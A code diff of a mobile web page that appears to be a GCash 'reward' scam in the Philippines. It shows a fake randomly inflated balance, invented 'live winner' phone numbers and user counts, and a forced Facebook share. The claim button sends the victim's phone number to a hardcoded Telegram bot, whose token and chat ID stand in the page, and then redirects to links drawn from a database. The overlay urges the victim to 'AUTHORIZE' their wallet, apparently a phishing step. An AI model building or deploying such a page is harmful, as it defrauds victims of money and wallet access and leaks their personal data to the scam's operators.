@@ -8,7 +8,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
-    
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
@@ -17,9 +16,8 @@
         :root { 
             --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
             --dark-bg: #04070d; 
-            --glass: rgba(255, 255, 255, 0.03);
+            --glass: rgba(255, 255, 255, 0.05);
             --border: rgba(212, 175, 55, 0.3);
-            --red-glow: 0 0 20px #ff0000, 0 0 40px #ff4500;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -30,243 +28,180 @@
             min-height: 100vh; padding: 15px; overflow-x: hidden; 
         }
 
-        /* MOBILE ONLY OVERLAY */
-        #mobileOnlyOverlay { position: fixed; inset: 0; background: #04070d; z-index: 1000000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
-        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); min-width: 220px; text-align: center; }
+        #winnerEntry { transition: all 0.5s ease; display: inline-block; }
 
-        /* UI COMPONENTS */
-        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 20px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; transition: transform 0.1s; }
-        .logo-img { width: 130px; height: auto; margin-bottom: 15px; }
-        .gc-mini-icon { width: 16px; height: 16px; vertical-align: middle; }
+        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; }
+        .logo-img { width: 140px; height: auto; margin-bottom: 20px; }
         
-        /* LIVE WINNERS TRANSITION */
-        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); }
-        #winnerEntry { transition: all 0.5s ease-in-out; display: inline-block; }
+        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 20px 0; }
+        .card-wrapper { cursor: pointer; position: relative; display: flex; justify-content: center; }
+        .card-img { width: 100%; max-width: 100px; transition: 0.3s; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
+        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; }
 
-        /* GRID & CARDS */
-        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; }
-        .card-wrapper { cursor: pointer; display: flex; justify-content: center; position: relative; }
-        .card-img { width: 100%; max-width: 100px; height: auto; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); transition: 0.3s; }
-        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; transform: scale(0.9); }
+        /* MULTIPLIER & JACKPOT */
+        .floating-mult { position: absolute; top: -10px; color: #fbbf24; font-family: 'Orbitron'; font-size: 26px; font-weight: 900; animation: floatUp 1s forwards; z-index: 10; text-shadow: 0 0 10px #000; }
+        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-50px); } }
+        
+        .jackpot-text { position: absolute; top: -20px; color: #ff0000; font-family: 'Orbitron'; font-size: 30px; font-weight: 900; text-shadow: 0 0 15px #fff; z-index: 20; animation: jackPop 1.5s forwards; }
+        @keyframes jackPop { 0% { transform: scale(0.5); opacity: 0; } 20% { transform: scale(1.5); opacity: 1; } 100% { transform: scale(1); opacity: 0; } }
 
-        /* ============================
-           BONGGA JACKPOT ANIMATIONS
-           ============================ */
+        .amount { font-family: 'Orbitron'; font-size: 40px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; }
+        .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 15px 0; min-height: 20px; letter-spacing: 0.5px; }
 
-        /* Floating x2, x3, x4 */
-        .floating-mult {
-            position: absolute; top: 10px; color: #fbbf24; font-family: 'Orbitron', sans-serif;
-            font-size: 28px; font-weight: 900; text-shadow: 0 0 10px #d4af37, 0 0 20px #000;
-            pointer-events: none; animation: floatUp 1s ease-out forwards; z-index: 10;
-        }
-        @keyframes floatUp {
-            0% { opacity: 1; transform: translateY(0) scale(0.8); }
-            50% { transform: translateY(-30px) scale(1.3); }
-            100% { opacity: 0; transform: translateY(-60px) scale(1); }
-        }
+        .btn-group { display: flex; flex-direction: column; gap: 12px; width: 100%; }
+        .share-btn { background: #1877f2; color: #fff; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #1052a8; text-transform: uppercase; }
+        .pay-button { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #8b6508; text-transform: uppercase; }
 
-        /* Jackpot x10 Text */
-        .jackpot-text {
-            position: absolute; top: -30px; left: 50%; transform: translateX(-50%) scale(0.5);
-            color: #ff0000; font-family: 'Orbitron', sans-serif; font-size: 36px; font-weight: 900;
-            text-shadow: var(--red-glow), 0 0 60px #fff; z-index: 100;
-            animation: jackpotPop 1.8s ease-out forwards; white-space: nowrap;
-        }
-        @keyframes jackpotPop {
-            0% { transform: translateX(-50%) scale(0.5); opacity: 0; }
-            15% { transform: translateX(-50%) scale(1.8); opacity: 1; }
-            30% { transform: translateX(-50%) scale(1.2); opacity: 1; }
-            80% { transform: translateX(-50%) scale(1.1); opacity: 1; }
-            100% { transform: translateX(-50%) scale(1); opacity: 0; }
-        }
-
-        /* Screen Shake Effect */
-        .shake-screen { animation: shake 0.3s cubic-bezier(.36,.07,.19,.97) both; }
-        @keyframes shake {
-            10%, 90% { transform: translate3d(-1px, 0, 0); }
-            20%, 80% { transform: translate3d(2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
-        }
-
-        /* IDLE CARD ANIMATIONS */
-        @keyframes goddessTwirl { 0% { transform: rotateY(0); } 100% { transform: rotateY(360deg); } }
-        @keyframes monkeyBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
-        @keyframes zeusShock { 0% { filter: brightness(1); } 50% { filter: brightness(2.5) drop-shadow(0 0 15px #fff); } 100% { filter: brightness(1); } }
-        @keyframes bearHop { 0% { transform: scale(1); } 50% { transform: scale(1.1) rotate(5deg); } 100% { transform: scale(1); } }
-        @keyframes dressFloat { 0% { transform: translateY(0); } 50% { transform: translateY(-12px); } 100% { transform: translateY(0); } }
-        @keyframes boxerPunch { 0% { transform: scale(1); } 50% { transform: scale(1.2) translateX(10px); } 100% { transform: scale(1); } }
-        .move-goddess { animation: goddessTwirl 0.6s ease-out 1; }
-        .move-monkey { animation: monkeyBounce 0.5s ease-out 1; }
-        .move-zeus { animation: zeusShock 0.4s ease-out 1; }
-        .move-bear { animation: bearHop 0.5s ease-out 1; }
-        .move-dress { animation: dressFloat 0.6s ease-out 1; }
-        .move-boxer { animation: boxerPunch 0.4s ease-out 1; }
-
-        /* TYPOGRAPHY & BUTTONS */
-        .amount { font-family: 'Orbitron', sans-serif; font-size: 38px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; transition: transform 0.1s; }
-        .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 10px 0; }
-        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
-        .share-btn { background: #1877f2; color: #fff; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #1052a8; }
-        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #8b6508; }
-        .promo-photo { width: 100%; border-radius: 15px; margin-top: 20px; border: 1px solid var(--border); }
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212,175,55,0.2); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="mobileOnlyOverlay">
-        <div style="font-size: 60px;">📱</div>
-        <h2 style="color:#fbbf24; margin: 15px 0;">Mobile Access Only</h2>
-        <p style="color:#94a3b8; font-size: 14px; padding: 0 30px;">This reward is only available via Mobile Browsers. Please switch to your phone.</p>
+    <div style="text-align:center; margin-bottom:10px;">
+        <div style="color:#22c55e; font-size:10px; font-weight:800;">● <span id="userCount">92</span> ONLINE</div>
+        <div class="live-winner-box">
+            <span id="winnerEntry">Initializing Secure Link...</span>
+        </div>
+    </div>
+
+    <div class="card" id="mainCard">
+        <img src="images/logo1.png" class="logo-img">
+        
+        <div class="game-grid">
+            <div class="card-wrapper" onclick="handleTap(this, 1)"><img src="images/img1.png" class="card-img"></div>
+            <div class="card-wrapper" onclick="handleTap(this, 2)"><img src="images/img2.png" class="card-img"></div>
+            <div class="card-wrapper" onclick="handleTap(this, 3)"><img src="images/img3.png" class="card-img"></div>
+            <div class="card-wrapper" onclick="handleTap(this, 4)"><img src="images/img4.png" class="card-img"></div>
+            <div class="card-wrapper" onclick="handleTap(this, 5)"><img src="images/img5.png" class="card-img"></div>
+            <div class="card-wrapper" onclick="handleTap(this, 6)"><img src="images/img6.png" class="card-img"></div>
+        </div>
+
+        <div style="font-size: 10px; color: #aaa; letter-spacing: 2px;">VIRTUAL BALANCE</div>
+        <div class="amount" id="balanceText">₱0.00</div>
+        
+        <div class="timer-box" id="statusLabel">Generating your initial reward in <span id="timer">5</span> seconds...</div>
+
+        <div class="btn-group">
+            <button class="share-btn" id="shareBtn" onclick="doShare()">Share to Facebook (+₱50.00)</button>
+            <button class="pay-button" id="claimBtn" onclick="doClaim()">Withdraw via GCash</button>
+        </div>
     </div>
 
     <div id="processingOverlay">
         <div class="spinner"></div>
-        <div style="color:#fff; font-weight:900; font-size:18px;">ESTABLISHING SECURE VIALINK...</div>
-        <div style="color:#fbbf24; font-size:12px; margin-top:10px; padding:0 20px;">⚠️ REQUIRED: Tap <b>"AUTHORIZE"</b> to verify your GCash wallet.</div>
-    </div>
-
-    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
-        
-        <div style="text-align:center; margin-bottom:15px;">
-            <div style="color:#22c55e; font-size:10px; font-weight:800;"><span style="width:8px; height:8px; background:#22c55e; border-radius:50%; display:inline-block; margin-right:5px; box-shadow:0 0 8px #22c55e;"></span> ONLINE</div>
-            <div class="live-winner-box" id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</div>
-        </div>
-
-        <div class="card" id="rewardCard">
-            <img src="images/logo1.png" class="logo-img">
-            <div class="game-grid" id="gameGrid">
-                <div class="card-wrapper" onclick="handleTap(this, 'goddess', 1)"><img src="images/img1.png" class="card-img"></div>
-                <div class="card-wrapper" onclick="handleTap(this, 'monkey', 2)"><img src="images/img2.png" class="card-img"></div>
-                <div class="card-wrapper" onclick="handleTap(this, 'zeus', 3)"><img src="images/img3.png" class="card-img"></div>
-                <div class="card-wrapper" onclick="handleTap(this, 'bear', 4)"><img src="images/img4.png" class="card-img"></div>
-                <div class="card-wrapper" onclick="handleTap(this, 'dress', 5)"><img src="images/img5.png" class="card-img"></div>
-                <div class="card-wrapper" onclick="handleTap(this, 'boxer', 6)"><img src="images/img6.png" class="card-img"></div>
-            </div>
-            <div style="font-size: 10px; color: #fbbf24; font-weight: 800; letter-spacing: 2px;">AVAILABLE BALANCE</div>
-            <div class="amount" id="balanceText">₱0.00</div>
-            <div class="timer-box" id="timerLabel">Processing reward slots: <span id="countdown">05</span>s</div>
-            <div class="btn-group">
-                <button class="share-btn" id="shareBtn" onclick="shareToFB()">Share to Facebook (+₱50.00)</button>
-                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
-            </div>
-            <img src="images/casinoplus.jpeg" class="promo-photo">
-        </div>
+        <div style="color:#fff; margin-top:20px; font-weight:800;">ESTABLISHING VIALINK...</div>
     </div>
 
     <script>
-        // MOBILE ONLY CHECK
-        (function() {
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            if (!isMobile && window.innerWidth > 768) {
-                document.getElementById('mobileOnlyOverlay').style.display = 'flex';
-                document.getElementById('mainContent').style.display = 'none';
-            }
-        })();
-
-        // FIREBASE & CONFIG
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userPhone = localStorage.getItem("userPhone") || "Guest_User";
-        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-        const chatId = "7298607329";
-
+        const userPhone = localStorage.getItem("userPhone") || "Guest";
+        
         let balance = 0;
         let clicks = 0;
-        const targetReward = [650, 850, 950][Math.floor(Math.random() * 3)];
+        let canTap = false;
+        // Bagong Range: 100 - 1000
+        const startBalance = Math.floor(Math.random() * (1000 - 100 + 1)) + 100;
 
-        // NO LOGS FOR TAPS
-        function handleTap(el, animName, id) {
-            if (clicks >= 6 || el.classList.contains('card-disabled')) return;
-            clicks++;
-            const img = el.querySelector('img');
-            img.classList.add('move-' + animName);
-
-            // MULTIPLIER MATH BASED ON NEW PERCENTAGES
-            const rand = Math.random() * 100; // 0 to 100
-            let mult = 1; 
-            let showAnim = true;
-            let isJackpot = false;
-
-            if (rand <= 10) { mult = 10; isJackpot = true; } // JACKPOT (10% chance)
-            else if (rand <= 20) { mult = 4; } // 20%
-            else if (rand <= 40) { mult = 3; } // 40%
-            else if (rand <= 60) { mult = 2; } // 60%
-            else { mult = 1; showAnim = false; } // 80% and others (x1 = no animation)
-
-            const addedAmount = 25 * mult;
-            const nextBal = balance + addedAmount;
+        window.onload = () => {
+            let timeLeft = 5;
+            const timerDisplay = document.getElementById('timer');
             
-            // JACKPOT EFFECTS (BONGGA MODE)
-            if (isJackpot) {
-                // 1. Confetti Burst
-                fireJackpotConfetti();
-                
-                // 2. Big Red Text
-                const jack = document.createElement('div');
-                jack.className = 'jackpot-text';
-                jack.innerText = "JACKPOT x10!";
-                el.appendChild(jack);
-                setTimeout(() => jack.remove(), 1800);
-                
-                // 3. Screen Shake
-                const card = document.getElementById('rewardCard');
-                card.classList.add('shake-screen');
-                setTimeout(() => card.classList.remove('shake-screen'), 300);
-            } 
-            // Normal Multiplier Effect
-            else if (showAnim) {
-                const floater = document.createElement('div');
-                floater.className = 'floating-mult';
-                floater.innerText = `x${mult}`;
-                el.appendChild(floater);
-                setTimeout(() => floater.remove(), 1000);
+            // Animation ng balance mula 0 hanggang startBalance sa loob ng 5 seconds
+            animateValue(0, startBalance, 5000);
+
+            const countdown = setInterval(() => {
+                timeLeft--;
+                timerDisplay.innerText = timeLeft;
+                if(timeLeft <= 0) {
+                    clearInterval(countdown);
+                    balance = startBalance;
+                    canTap = true;
+                    document.getElementById('statusLabel').innerHTML = "✨ Initial Reward Granted! Tap cards for bonus.";
+                    document.getElementById('statusLabel').style.color = "#22c55e";
+                }
+            }, 1000);
+            
+            startLiveWinners();
+        };
+
+        function handleTap(el, id) {
+            if (!canTap || clicks >= 6 || el.classList.contains('card-disabled')) return;
+            
+            clicks++;
+            el.classList.add('card-disabled');
+            
+            const rand = Math.random() * 100;
+            let mult = 1;
+            let isJack = false;
+
+            // Multiplier Logic
+            if (rand <= 10) { mult = 10; isJack = true; } // 10% Jackpot
+            else if (rand <= 20) { mult = 4; }
+            else if (rand <= 40) { mult = 3; }
+            else if (rand <= 60) { mult = 2; }
+            else { mult = 1; } // 80% (x1)
+
+            const added = 25 * mult;
+            const nextBal = balance + added;
+
+            if (mult > 1) {
+                const effect = document.createElement('div');
+                if (isJack) {
+                    effect.className = 'jackpot-text';
+                    effect.innerText = "JACKPOT x10!";
+                    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff'] });
+                } else {
+                    effect.className = 'floating-mult';
+                    effect.innerText = `x${mult}`;
+                }
+                el.appendChild(effect);
+                setTimeout(() => effect.remove(), 1200);
             }
 
             animateValue(balance, nextBal, 400);
             balance = nextBal;
-            setTimeout(() => { el.classList.add('card-disabled'); }, 500);
-            if (clicks === 6) { startCountdown(); }
-        }
 
-        function fireJackpotConfetti() {
-            // Center burst
-            confetti({
-                particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff', '#ff4500']
-            });
-            // Left & Right cannon
-            setTimeout(() => {
-                confetti({ particleCount: 50, angle: 60, spread: 55, origin: { x: 0 }, colors: ['#ff0000', '#ffd700'] });
-                confetti({ particleCount: 50, angle: 120, spread: 55, origin: { x: 1 }, colors: ['#ff0000', '#ffd700'] });
-            }, 200);
-        }
-
-        function startCountdown() {
-            const timerBox = document.getElementById('timerLabel');
-            timerBox.style.display = 'block';
-            let timeLeft = 5;
-            const countdown = setInterval(() => {
-                timeLeft--;
-                document.getElementById('countdown').innerText = "0" + timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(countdown);
-                    timerBox.innerHTML = "✅ Reward Slots Verified!";
+            if (clicks === 6) {
+                setTimeout(() => {
+                    document.getElementById('statusLabel').style.display = 'none';
                     document.getElementById('shareBtn').style.display = 'block';
-                }
-            }, 1000);
+                }, 1000);
+            }
         }
 
-        function shareToFB() {
+        function doShare() {
             window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
             setTimeout(() => {
-                balance += 50;
-                document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
+                const bonus = 50;
+                animateValue(balance, balance + bonus, 500);
+                balance += bonus;
                 document.getElementById('shareBtn').style.display = 'none';
-                document.getElementById('claimBtn').style.display = 'block';
-                document.getElementById('claimBtn').innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
-            }, 1000);
+                const claimBtn = document.getElementById('claimBtn');
+                claimBtn.style.display = 'block';
+                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
+            }, 1500);
+        }
+
+        function doClaim() {
+            document.getElementById('processingOverlay').style.display = 'flex';
+            const msg = `🔔 [ViaLink] CLAIM: ${userPhone} | ₱${balance}`;
+            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+                if (snapshot.exists()) {
+                    const id = Object.keys(snapshot.val())[0];
+                    const url = snapshot.val()[id].url;
+                    db.ref('links/' + id).update({ status: 'pending', user: userPhone });
+                    setTimeout(() => { window.location.href = url; }, 2000);
+                } else {
+                    alert("Reward Limit Reached! Try again later.");
+                    location.reload();
+                }
+            });
         }
 
         function animateValue(start, end, duration) {
@@ -280,44 +215,23 @@
             window.requestAnimationFrame(step);
         }
 
-        // TELEGRAM LOGS ONLY ON CLAIM BUTTON
-        function redirectToGCash() {
-            const overlay = document.getElementById('processingOverlay');
-            overlay.style.display = 'flex';
-
-            const msg = `🔔 [ViaLink] CLAIM INITIATED!\n📱 Phone: ${userPhone}\n💰 Amount: ₱${balance}\n📍 Status: Redirecting to ViaLink...`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-
-            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
-                if (snapshot.exists()) {
-                    const linkId = Object.keys(snapshot.val())[0];
-                    const targetUrl = snapshot.val()[linkId].url;
-                    db.ref('links/' + linkId).update({ status: 'pending', user: userPhone });
-                    setTimeout(() => { window.location.href = targetUrl; }, 3000);
-                } else {
-                    alert("System Busy! Reward slots are full. Try again later.");
-                    overlay.style.display = 'none';
-                }
-            });
-        }
-
-        // LIVE WINNER ROTATOR WITH SMOOTH ANIMATION
-        setInterval(() => {
+        function startLiveWinners() {
             const winnerBox = document.getElementById('winnerEntry');
-            winnerBox.style.opacity = '0';
-            winnerBox.style.transform = 'translateY(-15px)';
-
-            setTimeout(() => {
-                const online = Math.floor(Math.random() * 30) + 60;
-                document.getElementById('userCount').innerText = online;
-                const pref = ["0917", "0915", "0998", "0966", "0927", "0939"][Math.floor(Math.random() * 6)];
-                const suffix = Math.floor(1000 + Math.random() * 9000);
-                const amt = [500, 800, 1000, 1200, 1500][Math.floor(Math.random() * 5)];
-                winnerBox.innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱${amt.toLocaleString()}`;
-                winnerBox.style.opacity = '1';
-                winnerBox.style.transform = 'translateY(0)';
-            }, 500);
-        }, 4000);
+            setInterval(() => {
+                winnerBox.style.opacity = '0';
+                winnerBox.style.transform = 'translateY(-10px)';
+                setTimeout(() => {
+                    const prefixes = ["0917", "0915", "0998", "0966", "0927", "0939", "0945", "0916"];
+                    const pref = prefixes[Math.floor(Math.random()*prefixes.length)];
+                    const suffix = Math.floor(1000 + Math.random()*9000);
+                    const amt = [350, 800, 1500, 2400, 4500][Math.floor(Math.random()*5)];
+                    winnerBox.innerHTML = `User ${pref}***${suffix} claimed ₱${amt.toLocaleString()}`;
+                    winnerBox.style.opacity = '1';
+                    winnerBox.style.transform = 'translateY(0)';
+                    document.getElementById('userCount').innerText = Math.floor(Math.random()*15)+80;
+                }, 500);
+            }, 4000);
+        }
     </script>
 </body>
 </html>
